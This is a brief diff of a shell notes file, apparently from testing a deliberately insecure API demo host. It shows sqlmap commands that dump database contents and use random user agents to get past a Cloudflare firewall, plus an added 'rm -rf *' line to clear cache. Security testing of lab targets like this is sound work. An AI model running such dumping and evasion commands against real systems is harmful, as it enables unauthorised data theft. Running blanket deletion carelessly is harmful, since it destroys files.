@@ -26,6 +26,8 @@ rm -rf *
 wafw00f vampiinsecure.kvaes.be
 ## Scan the insecure version, no dump, cloudflare blocks
 sqlmap -u "https://vampiinsecure.kvaes.be/users/v1/*admin*" --method=GET --dump
+## remove caching info
+rm -rf *
 ## Try again with random agents, results in a dump
 sqlmap -u "https://vampiinsecure.kvaes.be/users/v1/*admin*" --method=GET --dump --random-agent
 ## remove caching info
